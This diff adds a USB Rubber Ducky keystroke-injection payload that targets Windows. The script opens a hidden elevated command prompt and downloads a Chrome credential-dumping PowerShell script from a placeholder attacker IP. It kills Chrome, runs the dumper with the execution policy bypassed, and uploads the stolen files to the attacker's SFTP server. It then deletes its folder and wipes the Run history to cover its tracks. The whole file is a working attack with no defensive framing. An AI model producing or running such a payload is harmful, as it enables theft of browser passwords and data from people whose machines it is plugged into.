@@ -1,0 +1,61 @@
+DELAY 1000
+GUI r
+DELAY 300
+REM [we obfuscate the cmd /K color FE&mode con:cols=18 lines=1]
+STRING cmd /K color FE&mode con:cols=18 lines=1 
+DELAY 300
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFTARROW
+DELAY 100
+ENTER 
+DELAY 300
+STRING cd C:\
+ENTER
+DELAY 100
+STRING md duckyChrome & cd duckyChrome & powershell wget 'http://[::PUBLIC::IP::]/Get-ChromeDump.ps1' -OutFile Get-ChromeDump.ps1
+ENTER
+DELAY 1000
+STRING powershell Stop-Process -Name chrome 
+ENTER
+DELAY 1000
+STRING powershell -ExecutionPolicy ByPass -File Get-ChromeDump.ps1
+ENTER
+DELAY 3000
+STRING powershell del $ENV:UserProfile\AppData\Local\System.Data.SQLite.dll
+ENTER
+DELAY 1000
+REM [We connect to our sftp server]
+STRING sftp -oPort=22 ducky@[::PUBLIC::IP]
+ENTER
+REM [If this is the first time we connect, we should put:]
+REM [STRING yes]
+REM [ENTER]
+DELAY 1200
+STRING [::PASSWORD::]
+DELAY 70
+ENTER
+DELAY 500
+REM [we enter the shared directory of our sftp server, where we have write permission]
+STRING cd [::FOLDER::SHARED::]
+ENTER
+DELAY 50
+STRING mput C:\duckyChrome\*.txt
+ENTER
+DELAY 3000
+STRING bye
+ENTER
+DELAY 200
+STRING cd ..
+ENTER 
+DELAY 50
+REM [delete unnecessary files]
+STRING rmdir "C:\duckyChrome" /s /q
+ENTER
+DELAY 50
+REM [we delete footprints in the windows r]
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+DELAY 50
+STRING exit
+ENTER
